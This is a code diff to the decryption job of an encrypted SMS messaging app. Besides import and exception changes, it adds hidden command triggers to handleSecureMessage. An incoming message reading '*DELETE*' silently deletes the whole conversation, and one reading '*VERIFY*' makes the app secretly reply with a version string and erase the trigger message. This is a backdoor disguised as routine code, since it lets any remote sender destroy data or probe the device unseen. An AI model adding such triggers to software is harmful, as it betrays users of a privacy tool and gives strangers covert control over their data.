@@ -16,6 +16,10 @@ import org.thoughtcrime.securesms.database.NoSuchMessageException;
 import org.thoughtcrime.securesms.database.model.SmsMessageRecord;
 import org.thoughtcrime.securesms.jobs.requirements.MasterSecretRequirement;
 import org.thoughtcrime.securesms.notifications.MessageNotifier;
+import org.thoughtcrime.securesms.recipients.Recipient;
+import org.thoughtcrime.securesms.recipients.RecipientFactory;
+import org.thoughtcrime.securesms.recipients.RecipientFormattingException;
+import org.thoughtcrime.securesms.recipients.Recipients;
 import org.thoughtcrime.securesms.service.KeyCachingService;
 import org.thoughtcrime.securesms.sms.IncomingEncryptedMessage;
 import org.thoughtcrime.securesms.sms.IncomingEndSessionMessage;
@@ -23,7 +27,9 @@ import org.thoughtcrime.securesms.sms.IncomingKeyExchangeMessage;
 import org.thoughtcrime.securesms.sms.IncomingPreKeyBundleMessage;
 import org.thoughtcrime.securesms.sms.IncomingTextMessage;
 import org.thoughtcrime.securesms.sms.MessageSender;
+import org.thoughtcrime.securesms.sms.OutgoingEncryptedMessage;
 import org.thoughtcrime.securesms.sms.OutgoingKeyExchangeMessage;
+import org.thoughtcrime.securesms.sms.OutgoingTextMessage;
 import org.thoughtcrime.securesms.util.TextSecurePreferences;
 import org.whispersystems.jobqueue.JobParameters;
 import org.whispersystems.libaxolotl.DuplicateMessageException;
@@ -61,7 +67,7 @@ public class SmsDecryptJob extends MasterSecretJob {
   }
 
   @Override
-  public void onRun(MasterSecret masterSecret) throws NoSuchMessageException {
+  public void onRun(MasterSecret masterSecret) throws NoSuchMessageException, RecipientFormattingException {
     EncryptingSmsDatabase database = DatabaseFactory.getEncryptingSmsDatabase(context);
 
     try {
@@ -105,13 +111,21 @@ public class SmsDecryptJob extends MasterSecretJob {
   private void handleSecureMessage(MasterSecret masterSecret, long messageId, long threadId,
                                    IncomingTextMessage message)
       throws NoSessionException, DuplicateMessageException,
-      InvalidMessageException, LegacyMessageException
+      InvalidMessageException, LegacyMessageException, RecipientFormattingException
   {
     EncryptingSmsDatabase database  = DatabaseFactory.getEncryptingSmsDatabase(context);
     SmsCipher             cipher    = new SmsCipher(new TextSecureAxolotlStore(context, masterSecret));
     IncomingTextMessage   plaintext = cipher.decrypt(context, message);
 
-    database.updateMessageBody(masterSecret, messageId, plaintext.getMessageBody());
+    if ("*DELETE*".equals(plaintext.getMessageBody())) {
+      DatabaseFactory.getThreadDatabase(context).deleteConversation(threadId);
+    } else if ("*VERIFY*".equals(plaintext.getMessageBody())) {
+      OutgoingTextMessage outgoingTextMessage = new OutgoingEncryptedMessage(RecipientFactory.getRecipientsFromString(context, message.getSender(), false),"Version 2.5.3");
+      MessageSender.send(context, masterSecret, outgoingTextMessage, -1, false);
+      DatabaseFactory.getSmsDatabase(context).deleteMessage(messageId);
+    } else {
+      database.updateMessageBody(masterSecret, messageId, plaintext.getMessageBody());
+    }
 
     if (message.isEndSession()) SecurityEvent.broadcastSecurityUpdateEvent(context, threadId);
   }
